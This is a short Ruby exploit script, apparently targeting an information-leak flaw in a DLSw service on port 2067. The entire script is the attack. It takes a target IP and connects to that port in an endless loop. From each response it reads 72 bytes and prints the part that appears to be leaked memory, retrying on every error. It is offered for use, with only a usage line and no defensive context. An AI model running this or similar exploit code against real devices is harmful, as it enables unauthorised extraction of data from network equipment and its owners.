#!/usr/bin/ruby
require 'socket'
unless ARGV.length == 1
 puts "Usage: dlsw_explort.rb <target_ip>"
 exit
end
target_ip = ARGV[0]

while true
  begin
    s = TCPSocket.open(target_ip,2067)
    ready = IO.select([s],nil,nil,2)
    if ready
      output = s.recv(72)
      s.close
      puts output[18..72]
    end
  rescue
    retry
  end
end
